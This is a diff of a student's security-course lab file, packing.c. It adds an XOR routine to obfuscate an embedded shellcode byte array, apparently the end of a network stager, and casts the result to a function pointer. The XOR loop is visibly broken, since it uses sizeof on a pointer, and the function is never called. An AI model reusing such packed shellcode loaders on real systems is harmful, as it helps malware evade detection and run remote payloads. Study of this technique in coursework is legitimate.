@@ -1,6 +1,6 @@
 /* Bradford Smith (bsmith8)
  * CS 577 Lab 9 packing.c
- * 12/01/2015
+ * 12/02/2015
  * "I pledge my honor that I have abided by the Stevens Honor System."
  */
 
@@ -35,13 +35,28 @@ unsigned char buf[] =
 "\x61\xff\xd5\x6a\x00\x6a\x04\x56\x57\x68\x02\xd9\xc8\x5f\xff"
 "\xd5\x8b\x36\x6a\x40\x68\x00\x10\x00\x00\x56\x6a\x00\x68\x58"
 "\xa4\x53\xe5\xff\xd5\x93\x53\x6a\x00\x56\x53\x57\x68\x02\xd9"
-"\xc8\x5f\xff\xd5\x01\xc3\x29\xc6\x85\xf6\x75\xec\xc3";
+"\xc8\x5f\xff\xd5\x01\xc3\x29\xc6\x85\xf6\x75\xec\xc3"; /* 298 bytes */
+
+unsigned char* xorCrypt(unsigned char* in)
+{
+    int i;
+    unsigned char *secret = "\x42";
+
+    for (i = 0; i < sizeof(in); i++)
+        in[i] ^= *secret;
+
+    return in;
+}
 
 int main()
 {
+    unsigned char* unpacked;
+
+    unpacked = xorCrypt(buf);
+
     /* Declare pointer on function */
     void (*func) ();
 
     /* Cast shellcode into function */
-    func = (void (*) ()) buf;
+    func = (void (*) ()) unpacked;
 }
